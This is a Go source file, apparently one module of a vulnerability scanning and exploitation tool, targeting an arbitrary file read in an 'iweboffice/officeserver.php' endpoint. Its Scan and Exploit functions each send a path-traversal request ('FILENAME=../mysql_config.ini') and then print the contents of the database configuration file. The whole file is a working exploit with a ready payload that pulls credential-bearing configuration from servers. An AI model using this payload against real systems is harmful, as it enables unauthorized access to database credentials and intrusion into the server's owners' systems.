package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wo06 struct {
}

func (s *Wo06) Scan(targetUrl string) {
	vulnerable, err := Wo06scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo06] 存在Officeserver 任意文件读取")
	} else {
		color.White("[Wo06] 不存在Officeserver 任意文件读取")
	}
}

func (*Wo06) Exploit(targetUrl string) {
	runResult, err := Wo06runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo06scancore(targetUrl string) (bool, error) {
	url := "/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "DBSTEP") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo06runcore(targetUrl string) (string, error) {
	url := "/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "DBSTEP") {
		return "存在Officeserver 任意文件读取\n" + resContent, nil
	} else {
		return "", nil
	}
}
